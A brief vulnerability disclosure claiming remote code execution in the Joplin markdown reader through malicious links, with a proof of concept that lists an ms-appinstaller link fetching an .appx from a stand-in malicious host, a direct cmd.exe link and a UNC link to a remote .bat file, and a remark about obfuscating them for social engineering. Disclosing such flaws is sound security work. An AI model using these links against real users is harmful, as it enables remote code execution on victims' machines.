# Joplin Remote Code Execution
Inspired by CVE-2026-20841, a remote code execution in Notepad using a markdown file, I decided to test some other markdown readers.

Joplin latest version (3.5.12) has a vulnerability when handling markdown malicious links. It is possible to execute files and download remote applications.

Proof of Concept:

Link: ms-appinstaller://?source=`https://www.evilpayload.com.br/xxx.appx`

Link: c:/windows/system32/cmd.exe

Link: file:///\\10.0.0.20\usuario_mal\calc.bat

It is possible to create obfuscated links to improve the social engineering against the victim.

<img width="973" height="557" alt="image" src="https://github.com/user-attachments/assets/4e010079-2d0a-4c91-a76c-a1cb6c30e109" />

